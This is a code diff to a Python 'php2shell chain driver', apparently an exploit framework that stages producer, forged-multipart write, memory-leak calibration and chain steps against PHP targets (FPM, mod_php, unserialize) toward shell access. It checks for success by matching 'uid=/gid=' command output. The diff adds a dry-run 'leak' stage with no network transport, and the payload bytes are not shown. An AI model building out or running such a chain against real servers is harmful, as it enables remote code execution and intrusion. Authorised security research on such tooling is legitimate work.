@@ -20,6 +20,7 @@ sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports
 
 from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
 from tool.modules import chain_stage as chain_stage_module  # noqa: E402
+from tool.modules import leak_stage as leak_stage_module  # noqa: E402
 from tool.modules import producer_fpmwiki as producer_stage  # noqa: E402
 from tool.modules import producer_modphp as modphp_producer_stage  # noqa: E402
 from tool.modules import producer_unser as unser_producer_stage  # noqa: E402
@@ -71,8 +72,8 @@ ID_LINE = re.compile(
     rb"gid=[0-9]+\([A-Za-z0-9_.-]+\) groups=[^\r\n]+$"
 )
 
-# argv-driven stage list (receipt ladder order): producer -> write_stage -> chain; recon reads.
-STAGES = ("recon", "producer", "write_stage", "chain")
+# argv-driven stage list (receipt ladder order): producer -> write_stage -> leak -> chain; recon reads.
+STAGES = ("recon", "producer", "write_stage", "leak", "chain")
 
 
 def run_producer_step(
@@ -208,6 +209,24 @@ def run_chain_step(
             host_header, path, producer_name, knob, body_bytes, sid,
             unser_path=unser_path, arm_path=arm_path, output=output)
     summary["step"] = "chain"
+    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+    (output / "result.json").write_text(rendered)
+    return summary, output / "result.json"
+
+
+def run_leak_step(
+    host_header: str, path: str, target_name: str, output: Path,
+) -> tuple[dict, Path]:
+    """Leak calibration plan: request shapes plus the algorithm, no transport."""
+    if target_name != "modphp":
+        raise ValueError(
+            "--step leak is wired for the modphp address profile only "
+            "(targets with a BINARY_PROFILES entry use the recon leak probe)"
+        )
+    entry = profiles.TARGETS.get("modphp") or {}
+    profile_path = HERE.parent / entry["address_profile"]
+    summary = leak_stage_module.dry(host_header, path, profile_path, output)
+    summary["step"] = "leak"
     rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
     (output / "result.json").write_text(rendered)
     return summary, output / "result.json"
@@ -552,7 +571,8 @@ def main() -> int:
         description="php2shell chain driver: --step recon (read-only receipt), "
         "--step producer (fpmwiki/modphp/unser producer modules: offline "
         "byte-build default, --live to fire), --step write_stage (dry: final "
-        "forged multipart bytes through the COMPACT engine, no send), or --step "
+        "forged multipart bytes through the COMPACT engine, no send), --step leak "
+        "(dry modphp calibration plan, no transport), or --step "
         "chain (modphp: ordered "
         "producer plus consumer sequence, dry default; fpm targets: legacy "
         "blocker-hold + rearm + forged staged multipart)"
@@ -679,9 +699,9 @@ def main() -> int:
 
     profile_name = args.profile
     sequence_chain = args.step == "chain" and target_name == "modphp"
-    if args.step != "producer" and not sequence_chain:
-        # producer is a byte-build stage; the modphp chain sequence uses the
-        # address profile, not a measured BINARY_PROFILES entry.
+    if args.step not in ("producer", "leak") and not sequence_chain:
+        # producer is a byte-build stage; leak and the modphp chain sequence
+        # use the address profile, not a measured BINARY_PROFILES entry.
         if profile_name is None:
             try:
                 profile_name = profiles.profile_for(target_name, url_target=(target_name is None))
@@ -834,6 +854,40 @@ def main() -> int:
             (args.output / "result.json").write_text(rendered)
             print(rendered, end="")
             return 2
+    elif args.step == "leak":
+        if args.live:
+            summary = {
+                "step": "leak",
+                "target": {"url": url, "host": host, "port": port, "path": path},
+                "dry_run": False,
+                "sent": False,
+                "error": "ValueError: --step leak has no transport (calibration "
+                         "plan only); use --dry-run",
+            }
+            rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+            args.output.mkdir(parents=True, exist_ok=True)
+            (args.output / "result.json").write_text(rendered)
+            print(rendered, end="")
+            return 2
+        try:
+            summary, _receipt = run_leak_step(
+                host_header, path, target_name, args.output)
+        except (OSError, TypeError, ValueError, KeyError) as error:
+            summary = {
+                "step": "leak",
+                "target": {"url": url, "host": host, "port": port, "path": path},
+                "dry_run": True,
+                "sent": False,
+                "error": f"{type(error).__name__}: {error}",
+            }
+            rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+            args.output.mkdir(parents=True, exist_ok=True)
+            (args.output / "result.json").write_text(rendered)
+            print(rendered, end="")
+            return 2
+        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
+        print(rendered, end="")
+        return 0
     elif args.step == "chain" and sequence_chain:
         sid = args.sid or chain_stage_module.DEFAULT_SID
         try:
